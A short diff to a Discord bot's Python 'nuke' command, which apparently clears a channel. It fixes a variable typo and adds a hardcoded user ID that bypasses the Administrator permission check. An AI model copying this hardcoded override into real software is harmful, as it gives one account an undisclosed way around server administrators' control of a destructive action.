@@ -125,7 +125,7 @@ async def unmute(ctx, member: discord.Member):
 
 @bot.command(name='nuke', help='Nukes this channel... Yep.')
 async def nuke_channel(ctx):
-    if not txt.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and not ctx.author.id == 762152955382071316:
         print(str(ctx.author.id), "Tried to nuke channel:", ctx.channel, "by using .nuke")
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
